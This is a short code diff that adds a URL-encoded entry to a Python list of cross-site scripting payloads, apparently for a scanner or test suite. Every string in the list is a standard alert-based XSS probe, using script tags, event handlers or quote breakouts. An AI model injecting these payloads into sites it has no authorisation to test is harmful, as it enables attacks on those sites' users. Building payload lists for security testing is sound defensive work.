@@ -11,6 +11,7 @@ payloads = [
     "'\"><script>alert('XSS')</script>",
     "<img src='x' onerror='alert(\"XSS\")'>",
     "<svg/onload=alert('XSS')>",
+    "%3Cscript%3Ealert%28'XSS'%29%3C%2Fscript%3E",
     "';alert('XSS');//"
 ]
 
